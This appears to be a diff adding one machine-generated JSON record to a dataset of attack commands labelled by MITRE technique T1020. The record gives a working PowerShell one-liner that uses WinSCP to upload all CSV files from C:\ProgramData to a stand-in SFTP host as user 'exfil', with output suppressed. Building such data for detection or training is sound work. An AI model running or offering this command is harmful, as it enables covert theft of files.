@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1020",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "[Reflection.Assembly]::LoadFile('C:\\Program Files (x86)\\WinSCP\\WinSCPnet.dll') | Out-Null; $so=New-Object WinSCP.SessionOptions -Property @{ Protocol=[WinSCP.Protocol]::Sftp; HostName='192.0.2.10'; UserName='exfil'; Password='S3cr3t!'; SshHostKeyFingerprint='ssh-ed25519 255 SHA256:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=' }; $s=New-Object WinSCP.Session; $s.Open($so); $to=New-Object WinSCP.TransferOptions; $to.ResumeSupport.State=[WinSCP.TransferResumeSupportState]::On; $s.PutFiles('C:\\ProgramData\\*.csv','/data/',$false,$to) | Out-Null; $s.Dispose() 2>$null",
+  "explanation": "Uses the WinSCP .NET assembly from PowerShell to programmatically exfiltrate CSV files over SFTP with resume support and no console output.",
+  "rationale_steps": [
+    "Load WinSCP .NET library into PowerShell",
+    "Create session options with host key pinning",
+    "Open session and configure transfer options",
+    "Upload matching files and dispose session silently"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1020-1f3f2541-8626286d",
+  "source_prompt_hash": "1f3f2541",
+  "timestamp_utc": "2025-09-30T09:07:17.472275Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
